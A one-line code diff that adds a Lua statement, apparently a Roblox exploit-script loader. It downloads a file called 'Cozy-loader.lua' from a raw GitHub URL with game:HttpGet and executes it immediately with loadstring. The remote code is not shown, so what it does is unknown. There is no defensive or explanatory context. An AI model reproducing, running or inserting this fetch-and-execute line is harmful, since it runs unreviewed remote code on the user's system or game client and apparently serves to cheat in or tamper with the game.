@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hyuxalt/loader/refs/heads/main/Cozy-loader.lua"))()
